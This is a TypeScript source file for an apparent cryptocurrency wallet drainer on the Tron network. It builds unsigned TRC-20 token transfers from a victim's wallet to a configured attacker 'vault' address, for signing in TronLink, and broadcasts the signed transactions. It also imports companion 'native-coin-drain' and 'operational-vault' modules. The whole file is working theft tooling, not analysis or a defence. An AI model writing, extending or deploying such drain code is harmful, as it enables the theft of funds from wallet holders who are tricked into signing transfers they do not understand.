/**
 * Tron TRC-20 token drain — unsigned smart-contract transfer for TronLink signing + relay.
 */
import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
import { parseNativeAmount } from './native-coin-drain.js'
import { broadcastSignedTrxNativeTransfer } from './tron-native-drain.js'
import { resolveTronVaultAddress } from './operational-vault.js'

export type Trc20TransferRequest = {
  from: string
  to: string
  contract: string
  amount: string
  /** Unsigned Tron transaction object — TronLink `tronWeb.trx.sign`. */
  unsignedTransaction: Record<string, unknown>
  wallet: 'tronlink'
}

async function createTronWeb(fullHost: string) {
  const { TronWeb } = await import('tronweb')
  const headers = tronProApiHeaders()
  return headers != null
    ? new TronWeb({ fullHost, headers })
    : new TronWeb({ fullHost })
}

/**
 * Build unsigned TRC-20 `transfer(address,uint256)` for TronLink wallet signing.
 */
export async function buildTrc20TransferTx(
  wallet: string,
  to: string,
  contract: string,
  amount: bigint,
  rpcUrl?: string,
): Promise<Trc20TransferRequest> {
  if (amount <= 0n) {
    throw new Error('TRC-20 transfer amount must be greater than zero')
  }

  const fullHost = rpcUrl?.trim() || resolveTronSensoryFullHost()
  const tronWeb = await createTronWeb(fullHost)

  const functionSelector = 'transfer(address,uint256)'
  const parameter = [
    { type: 'address', value: to },
    { type: 'uint256', value: amount.toString() },
  ]

  const unsignedTransaction = (await tronWeb.transactionBuilder.triggerSmartContract(
    contract,
    functionSelector,
    { feeLimit: 100_000_000, callValue: 0 },
    parameter,
    wallet,
  )) as unknown as { transaction?: Record<string, unknown> }

  const tx = unsignedTransaction.transaction
  if (tx == null || typeof tx !== 'object') {
    throw new Error('TronGrid did not return a TRC-20 transfer transaction')
  }

  return {
    from: wallet,
    to,
    contract,
    amount: amount.toString(),
    unsignedTransaction: tx,
    wallet: 'tronlink',
  }
}

/** Build TRC-20 drain plan using configured sovereign vault destination. */
export async function buildTrc20DrainForBatch(params: {
  wallet: string
  contract: string
  amount: bigint
  vault?: string
  rpcUrl?: string
}): Promise<Trc20TransferRequest | null> {
  if (params.amount <= 0n) return null
  const vault = params.vault ?? resolveTronVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_TRON or SOVEREIGN_VAULT_TRON required for TRC-20 drain')
  }
  return buildTrc20TransferTx(params.wallet, vault, params.contract, params.amount, params.rpcUrl)
}

/** Broadcast wallet-signed TRC-20 transfer transaction. */
export async function executeTrc20TokenDrain(params: {
  signedTransaction: Record<string, unknown>
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  return broadcastSignedTrxNativeTransfer({
    signedTransaction: params.signedTransaction,
    rpcUrl: params.rpcUrl,
  })
}

export { parseNativeAmount as parseTrc20Amount }
